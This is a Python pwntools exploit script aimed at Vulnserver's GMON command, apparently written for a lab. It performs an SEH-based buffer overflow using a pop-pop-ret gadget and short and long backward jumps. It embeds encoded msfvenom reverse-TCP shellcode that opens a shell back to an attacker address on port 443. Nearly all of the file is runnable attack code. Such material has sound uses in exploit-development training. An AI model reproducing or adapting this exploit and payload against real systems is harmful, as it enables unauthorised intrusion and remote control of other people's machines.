from pwn import * # pylint: disable=unused-wildcard-import
context.log_level = 'debug' # pylint: disable=assigning-non-slot

# IP and port of the target (Vulnserver).
ip = "192.168.1.132"
port = 9999

# cyclic -l 0x61646A62
offset_seh = 3508
#   0x625010b4 : pop ebx # pop ebp # ret  | [essfunc.dll]
seh = 0x625010b4 # Address of pop pop ret.

nseh = "\xEB\xF9\x90\x90" # jmp -5 (jnz +0x6; jz +0x4 : \x75\x06\x74\x04)

# Here we put the shellcode we want to execute.
offset_sc = offset_seh + 4
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.139 LPORT=443 EXITFUNC=thread -f c -b "\x00"
# Payload size: 351 bytes
shellcode = ("\x90"*16+
"\xbe\x7e\xa9\xdc\xe9\xdd\xc1\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x75\x0e\x03\x0b\xa7\x3e\x1c\x0f\x5f\x3c"
"\xdf\xef\xa0\x21\x69\x0a\x91\x61\x0d\x5f\x82\x51\x45\x0d\x2f"
"\x19\x0b\xa5\xa4\x6f\x84\xca\x0d\xc5\xf2\xe5\x8e\x76\xc6\x64"
"\x0d\x85\x1b\x46\x2c\x46\x6e\x87\x69\xbb\x83\xd5\x22\xb7\x36"
"\xc9\x47\x8d\x8a\x62\x1b\x03\x8b\x97\xec\x22\xba\x06\x66\x7d"
"\x1c\xa9\xab\xf5\x15\xb1\xa8\x30\xef\x4a\x1a\xce\xee\x9a\x52"
"\x2f\x5c\xe3\x5a\xc2\x9c\x24\x5c\x3d\xeb\x5c\x9e\xc0\xec\x9b"
"\xdc\x1e\x78\x3f\x46\xd4\xda\x9b\x76\x39\xbc\x68\x74\xf6\xca"
"\x36\x99\x09\x1e\x4d\xa5\x82\xa1\x81\x2f\xd0\x85\x05\x6b\x82"
"\xa4\x1c\xd1\x65\xd8\x7e\xba\xda\x7c\xf5\x57\x0e\x0d\x54\x30"
"\xe3\x3c\x66\xc0\x6b\x36\x15\xf2\x34\xec\xb1\xbe\xbd\x2a\x46"
"\xc0\x97\x8b\xd8\x3f\x18\xec\xf1\xfb\x4c\xbc\x69\x2d\xed\x57"
"\x69\xd2\x38\xf7\x39\x7c\x93\xb8\xe9\x3c\x43\x51\xe3\xb2\xbc"
"\x41\x0c\x19\xd5\xe8\xf7\xca\x1a\x44\xf6\x81\xf3\x97\xf8\x94"
"\xb8\x11\x1e\xfc\xae\x77\x89\x69\x56\xd2\x41\x0b\x97\xc8\x2c"
"\x0b\x13\xff\xd1\xc2\xd4\x8a\xc1\xb3\x14\xc1\xbb\x12\x2a\xff"
"\xd3\xf9\xb9\x64\x23\x77\xa2\x32\x74\xd0\x14\x4b\x10\xcc\x0f"
"\xe5\x06\x0d\xc9\xce\x82\xca\x2a\xd0\x0b\x9e\x17\xf6\x1b\x66"
"\x97\xb2\x4f\x36\xce\x6c\x39\xf0\xb8\xde\x93\xaa\x17\x89\x73"
"\x2a\x54\x0a\x05\x33\xb1\xfc\xe9\x82\x6c\xb9\x16\x2a\xf9\x4d"
"\x6f\x56\x99\xb2\xba\xd2\xb9\x50\x6e\x2f\x52\xcd\xfb\x92\x3f"
"\xee\xd6\xd1\x39\x6d\xd2\xa9\xbd\x6d\x97\xac\xfa\x29\x44\xdd"
"\x93\xdf\x6a\x72\x93\xf5")

# jmp -355
big_jmp ="\xE9\x98\xFE\xFF\xFF"

cmd = "GMON /.:/"

# Create our payload.
payload = fit({
    0:cmd,
    offset_seh - 367 - 9:shellcode,
    offset_seh -9:big_jmp,
    offset_seh - 4:nseh,
    offset_seh:seh,
    },length=5000)

io = remote(ip,port)
io.readline()
io.sendline(payload)
